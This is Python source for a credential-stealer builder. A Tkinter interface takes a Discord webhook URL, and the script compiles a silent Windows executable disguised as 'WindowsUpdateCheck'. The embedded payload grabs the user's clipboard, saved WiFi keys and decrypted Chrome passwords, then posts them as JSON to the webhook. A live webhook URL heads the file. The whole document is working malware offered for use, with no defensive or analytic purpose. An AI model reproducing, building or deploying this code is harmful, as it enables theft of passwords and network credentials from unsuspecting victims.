https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO


import os
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk
import shutil
import tempfile
import textwrap
import requests

# =================== WEBHOOK TEST ===================
def test_webhook(hook):
    try:
        resp = requests.post(hook, json={"content": "Full stealer test - webhook alive ðŸ”¥"}, timeout=10)
        if resp.status_code in [200, 204]:
            return True, "Webhook working - test message sent."
        else:
            return False, f"Failed ({resp.status_code})"
    except Exception as e:
        return False, f"Error: {str(e)}"

# =================== GUI ===================
def get_webhook():
    root = tk.Tk()
    root.title("Password Stealer Builder - Silent & Reliable")
    root.geometry("600x320")
    root.resizable(False, False)
    
    tk.Label(root, text="Discord Webhook URL:", font=("Arial", 11)).pack(pady=15)
    webhook_entry = tk.Entry(root, width=80)
    webhook_entry.pack(pady=5)
    
    def run_test():
        hook = webhook_entry.get().strip()
        success, msg = test_webhook(hook)
        if success:
            messagebox.showinfo("OK", msg)
        else:
            messagebox.showerror("Failed", msg)
    
    tk.Button(root, text="TEST WEBHOOK", command=run_test, bg="#5865F2", fg="white", font=("Arial", 10, "bold")).pack(pady=10)
    
    progress = ttk.Progressbar(root, mode="indeterminate")
    
    def build():
        webhook = webhook_entry.get().strip()
        if not webhook or "discord.com/api/webhooks" not in webhook:
            messagebox.showerror("Nope", "Valid Discord webhook required.")
            return
        
        progress.pack(pady=15)
        progress.start()
        root.update()
        
        try:
            generate_malware(webhook)
            progress.stop()
            progress.pack_forget()
            messagebox.showinfo("Built", 
                "stealer.exe ready!\n\n"
                "Based on your WORKING recon stub + full password grab.\n"
                "â€¢ Chrome saved passwords (weak ones like 'possword' highlighted)\n"
                "â€¢ All WiFi passwords\n"
                "â€¢ Clipboard\n"
                "â€¢ Basic recon\n"
                "Sends JSON file + fallback text. 100% silent.")
        except Exception as e:
            progress.stop()
            progress.pack_forget()
            messagebox.showerror("Error", f"Build failed:\n{str(e)}")
        root.destroy()
    
    tk.Button(root, text="BUILD EXE", command=build, bg="green", fg="white", font=("Arial", 14, "bold"), height=2).pack(pady=20)
    root.mainloop()

# =================== FULL STEALER PAYLOAD (BASED ON WORKING ONE) ===================
stealer_code = textwrap.dedent('''
import os
import json
import sqlite3
import win32crypt
import shutil
import subprocess
import requests
import getpass
import platform
import socket
from datetime import datetime
import ctypes
import time

WEBHOOK = "{WEBHOOK_PLACEHOLDER}"

def gather_data():
    data = {}
    user = getpass.getuser()
    data['user'] = user
    data['hostname'] = socket.gethostname()
    data['os'] = platform.platform()
    data['time'] = datetime.now().isoformat()

    # Clipboard
    try:
        CF_TEXT = 1
        user32 = ctypes.windll.user32
        user32.OpenClipboard(0)
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            handle = user32.GetClipboardData(CF_TEXT)
            data['clipboard'] = ctypes.c_char_p(handle).value.decode('utf-8', errors='ignore')
        user32.CloseClipboard()
    except:
        data['clipboard'] = "failed"

    # WiFi
    data['wifi'] = []
    try:
        profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True, errors='ignore').decode('utf-8', errors='ignore')
        profile_names = [line.split(":")[1].strip() for line in profiles.split('\\n') if "All User Profile" in line]
        for profile in profile_names:
            try:
                result = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], text=True, errors='ignore').decode('utf-8', errors='ignore')
                key = [line.split(":")[1].strip() for line in result.split('\\n') if "Key Content" in line]
                if key:
                    data['wifi'].append({profile: key[0]})
            except:
                pass
    except:
        data['wifi'] = ["failed"]

    # Chrome passwords
    data['chrome_passwords'] = []
    login_db = f"C:\\\\Users\\\\{user}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data"
    if os.path.exists(login_db):
        try:
            temp_db = os.path.join(os.getenv("TEMP"), "LoginTemp")
            shutil.copy2(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_pw = row[2]
                try:
                    decrypted = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1].decode('utf-8')
                    if any(weak in decrypted.lower() for weak in ["possword", "p@ssw0rd", "password", "admin", "123", "qwerty", "letmein"]):
                        data['chrome_passwords'].append({"url": url, "user": username, "pass": decrypted})
                except:
                    pass
            conn.close()
            os.remove(temp_db)
        except:
            data['chrome_passwords'] = ["failed or locked"]

    return data

def exfil():
    time.sleep(5)
    payload_json = json.dumps(gather_data(), indent=2)
    temp_file = os.path.join(os.getenv("TEMP"), "report.json")
    try:
        with open(temp_file, "w", encoding="utf-8") as f:
            f.write(payload_json)
        with open(temp_file, "rb") as f:
            files = {"file": ("grab.json", f)}
            content = {"content": f"**Full Grab** - {getpass.getuser()}@{socket.gethostname()}"}
            requests.post(WEBHOOK, data=content, files=files, timeout=30)
    except:
        try:
            requests.post(WEBHOOK, json={"content": f"**Fallback Grab**\\n```json\\n{payload_json}\\n```"})
        except:
            pass
    finally:
        try:
            os.remove(temp_file)
        except:
            pass

exfil()

while True:
    time.sleep(3600)
''')

# =================== BUILD WITH NUCLEAR PYWIN32 FLAGS ===================
def generate_malware(webhook):
    temp_dir = tempfile.mkdtemp()
    script_path = os.path.join(temp_dir, "stealer.py")
    
    try:
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", webhook))
        
        cmd = [
            "pyinstaller",
            "--onefile",
            "--noconsole",
            "--name", "WindowsUpdateCheck",
            "--hidden-import", "win32crypt",
            "--hidden-import", "pywintypes",
            "--hidden-import", "pythoncom",
            "--collect-all", "win32crypt",
            "--collect-all", "pywin32",
            "--collect-submodules", "win32crypt",
            script_path
        ]
        
        result = subprocess.run(cmd, cwd=temp_dir, capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"PyInstaller failed:\\n{result.stderr}")
        
        built_exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
        final_exe = os.path.join(os.getcwd(), "stealer.exe")
        shutil.copyfile(built_exe, final_exe)
        print(f"Stealer built: {final_exe}")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)  # No leftover .py ever

if __name__ == "__main__":
    get_webhook()

if __name__ == "__main__":
    get_webhook()
